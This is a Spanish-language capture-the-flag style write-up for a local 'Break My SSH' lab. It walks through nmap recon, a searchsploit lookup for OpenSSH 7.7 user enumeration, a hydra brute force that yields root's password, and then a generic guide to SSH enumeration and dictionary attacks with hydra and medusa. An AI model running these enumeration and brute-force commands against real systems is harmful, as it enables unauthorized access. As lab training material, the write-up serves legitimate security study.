- Tags: #BreakMySSH
---
- [Break My SSH](https://mega.nz/file/hfE3lbwZ#ExAcF54AyOHeJqgH2R4cDIAGc5IVlJnI5Rs-Us2QMpM) ==> Enlace de descarga al laboratorio, procedemos a descargar el comprimido, Lo descomprimimos y lo desplegamos:
```bash
7z x breakmyssh.zip

sudo bash auto_deploy.sh breakmyssh.tar
```
---
- **( 172.17.0.2 )** ==> Direccion ip del **target**

- #### Fase Reconocimiento:
```bash
ping -c 1 172.17.0.2 # Lanzamos un ping para ver la conectividad con el target y por el ttl determinamos que estamos ante una maquina Linux

 wichSystem.py 172.17.0.2

172.17.0.2 (ttl -> 64): Linux # Nuestra utilidad nos confirma que estamos ante una maquina linux
```
---

- #### Fase Reconocimiento Puertos:
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Solo detectamos el puerto 22 ssh expuesto
```
---
- **@** Realizamos un escaneo exhauxtivo para dermniar el servicio y la version que corren detras de este puerto
```bash
nmap -sC -sV -p22 172.17.0.2 -oN targeted 
```
---
- **(  22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0) )** ==> Tenemos expuesto esta version de **ssh** desactualizada. El cual es nuestro posible vector de ataque, Buscamos por un exploit para la posible enumeracion **ssh**
```bash
searchsploit ssh user enumeration
```
---
```bash
searchsploit ssh user enumeration

OpenSSH < 7.7 - User Enumeration (2)  |  linux/remote/45939.py # Usaremos este exploit para realizar enumeracion.
```
---

- # Fase Explitacion

- **Nota** ==> Para nuestro caso usaremos la herramienta **hydra** para obtener las credenciales:
```bash
hydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://172.17.0.2

# Credenciales obtenidas
[22][ssh] host: 172.17.0.2   login: root   password: estrella

 ssh-keygen -R 172.17.0.2 && ssh root@172.17.0.2 # Nos conectamos con privilegios elevados.
```

#### 1. Verificar Vulnerabilidades Conocidas
OpenSSH 7.7 (2018) tiene vulnerabilidades reportadas. Las más relevantes son:

##### CVE-2018-15473 (User Enumeration):
   - **Descripción**: Permite enumerar usuarios válidos analizando diferencias en los tiempos de respuesta del servidor al intentar autenticarse.
   - **Herramienta**: `ssh-user-enum` o `Metasploit (auxiliary/scanner/ssh/ssh_enumusers)`.
   - **Uso**:
     ```bash
     python3 ssh-user-enum.py -U usuarios.txt -t 192.168.1.100
     ```
     - `usuarios.txt`: Lista de posibles usuarios (ej: `admin`, `root`, `test`, nombres comunes).

##### Otras CVEs:
   - **CVE-2021-41617** (vulnerabilidad en versión patched a partir de 8.8): No aplica para 7.7.
   - **Conclusión**: La versión 7.7 no tiene exploits públicos críticos para RCE o bypass de autenticación, pero sí permite enumeración de usuarios.
---
#### 2. Enumerar Usuarios Válidos
Si no hay CVEs explotables, usa técnicas alternativas:\
##### a. Fuerza Bruta de Usuarios:
   - **Diccionarios recomendados**:
     - `/usr/share/seclists/Usernames/` (Kali Linux).
     - Listas personalizadas basadas en el contexto (ej: nombre de empresa + palabras comunes).
   - **Herramientas**:
     - `hydra` para SSH:
       ```bash
       hydra -L usuarios.txt -P passwords.txt ssh://IP -t 4 -V
       ```
     - `medusa`:
       ```bash
       medusa -h IP -U usuarios.txt -P passwords.txt -M ssh
       ```
---
#### 3. Fuerza Bruta de Credenciales
Una vez obtenidos posibles usuarios:

##### Ataque con Diccionarios:
   - **Listas de contraseñas recomendadas**:
     - `rockyou.txt` (clásico).
     - `SecLists/Passwords/Common-Credentials/`.
   - **Comando Hydra**:
     ```bash
     hydra -L usuarios_validos.txt -P rockyou.txt -t 6 -V -f ssh://IP
     ```
     - `-f`: Detiene el ataque al encontrar la primera contraseña válida.

##### Reglas de Transformación:
   - Usa `hashcat` o `John the Ripper` para generar variantes de contraseñas (ej: añadir números o símbolos al final).
---
#### Ejemplo de Flujo de Ataque Exitoso
1. **Enumerar usuarios** con `ssh-user-enum` y obtener `usuario: admin`.
2. **Fuerza bruta de contraseña** con Hydra:
   ```bash
   hydra -l admin -P rockyou.txt ssh://IP -V
   ```
3. **Resultado**: 
   ```bash
   [22][ssh] host: IP   login: admin   password: admin123
   ```
4. **Acceso concedido**:
   ```bash
   ssh admin@IP
   ```
---